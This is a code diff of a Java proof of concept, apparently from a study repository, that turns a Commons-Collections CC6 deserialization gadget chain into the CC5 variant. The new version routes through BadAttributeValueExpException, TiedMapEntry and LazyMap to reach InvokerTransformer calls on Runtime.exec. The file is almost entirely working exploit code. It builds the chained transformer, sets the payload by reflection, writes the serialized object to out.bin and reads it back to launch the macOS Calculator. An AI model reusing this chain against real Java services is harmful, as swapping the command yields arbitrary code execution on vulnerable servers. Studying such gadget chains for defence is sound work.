@@ -5,6 +5,7 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import javax.management.BadAttributeValueExpException;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
@@ -15,28 +16,39 @@ import java.util.Map;
 
 /**
  * @author yhy
- * @date 2021/6/27 11:41
+ * @date 2021/6/30 21:05
  * @github https://github.com/yhy0
  */
+
 /*
 	Gadget chain:
-	    java.io.ObjectInputStream.readObject()
-            java.util.HashMap.readObject()     这里不同
-                java.util.HashMap.put()
-                java.util.HashMap.hash()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
-                        org.apache.commons.collections.map.LazyMap.get()
-                            org.apache.commons.collections.functors.ChainedTransformer.transform()
-                            org.apache.commons.collections.functors.InvokerTransformer.transform()
-                            java.lang.reflect.Method.invoke()
-                                java.lang.Runtime.exec()
-*/
+        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
 
-public class CommonCollections6 {
+	Requires:
+		commons-collections
+ */
+/*
+This only works in JDK 8u76 and WITHOUT a security manager
+
+https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
+ */
+
+public class CommonCollections5 {
     public static void main(String[] args) throws Exception {
-        // 人畜无害的Transformer数组
-        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
         //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -48,37 +60,27 @@ public class CommonCollections6 {
                         new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                 new ConstantTransformer(1), // 隐藏错误信息
         };
-        //将 fakeTransformers 数组存入 ChainedTransformer 这个继承类,只在执行时加入执行的数组，防止干扰
-        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+        Transformer transformerChain = new ChainedTransformer(transformers);
 
         Map innerMap = new HashMap();
         //使用 LazyMap
         Map outerMap = LazyMap.decorate(innerMap,transformerChain);
 
-        // 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下
         TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"yhy");
-//        tiedMapEntry.hashCode();
+//        tiedMapEntry.toString();
 
-//        // HashMap 自动触发
-        HashMap hashMap = new HashMap();
+        // 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry
+        BadAttributeValueExpException bad = new BadAttributeValueExpException(1);
+        Field val = bad.getClass().getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(bad, tiedMapEntry);
 
-        hashMap.put(tiedMapEntry, "yhy");
-
-        // put 后再把key去除，防止影响后续执行
-        outerMap.remove("yhy");
-
-        // 反射加入payload ,这样在put时就不会执行
-        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
-        f.setAccessible(true);
-        f.set(transformerChain, transformers);
-
-        // 序列化
+//        // 序列化
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
-        oos.writeObject(hashMap);
+        oos.writeObject(bad);
 
         // 反序列化读取 out.bin 文件
         ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
         ois.readObject();
-
     }
 }
